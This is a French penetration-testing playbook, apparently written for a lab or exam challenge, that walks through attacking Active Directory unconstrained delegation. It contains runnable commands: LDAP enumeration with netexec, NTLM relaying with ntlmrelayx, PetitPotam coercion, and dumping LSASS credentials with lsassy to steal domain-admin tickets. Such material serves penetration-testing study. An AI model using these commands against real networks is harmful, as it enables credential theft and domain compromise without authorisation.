# Playbook 08 — Délégation non contrainte

> Runbook étapes 73–76 | Challenge : *Libéré, délivré, non contraint* (si unconstrained, pas constrained)

## Variables

```bash
export DC_IP=10.13.37.42
export USER=pentester
export PASS='Password123!'
```

---

### Étape 1 — Lister comptes/machines Unconstrained Delegation

```bash
nxc ldap 10.13.37.42 -u 'pentester' -p 'Password123!' --trusted-for-delegation
```

**Résultat attendu** : machines avec TRUSTED_FOR_DELEGATION (hors DC si anormal, ex. serveur web).

**Journal** : noter le hostname (TP MegaCorp : SRV-WEB — sur Celestina : vérifier au examen).

---

### Étape 2 — BloodHound — TrustedForDelegation

```bash
grep -i "TrustedToAuth\|trustedfordelegation" *.json
```

---

### Étape 3 — Coercition + capture TGT (schéma classique)

> Nécessite contrôle d’un poste + outil de coercition (PetitPotam, printerbug…) vers la cible UD.

```bash
# Exemple type (adapter IP/noms au examen)
ntlmrelayx.py -t ldap://dc-celestina.celestina.shop --delegate-access
python3 PetitPotam.py 10.13.37.42 WK-CIBLE.celestina.shop
```

---

### Étape 4 — Extraire TGT DA depuis mémoire (si session sur hôte UD)

```bash
nxc smb WK-CIBLE.celestina.shop -u 'COMPROMISED' -p 'PASS' -M lsassy
# Chercher TGT Administrator ou compte à privilèges dans /root/.nxc/modules/lsassy/
```

---

### Étape 5 — Différencier constrained vs unconstrained

| Type | Indice BloodHound / LDAP | Outil |
|------|--------------------------|-------|
| Constrained | `msDS-AllowedToDelegateTo` | getST.py S4U |
| Unconstrained | `TRUSTED_FOR_DELEGATION` sur machine | Coerce + dump TGT |

Sur Celestina TP blanc : **k.cedepte → constrained** vers WK-155. Unconstrained peut être un second chemin ou flag distinct — toujours lancer étape 1 à l’examen.
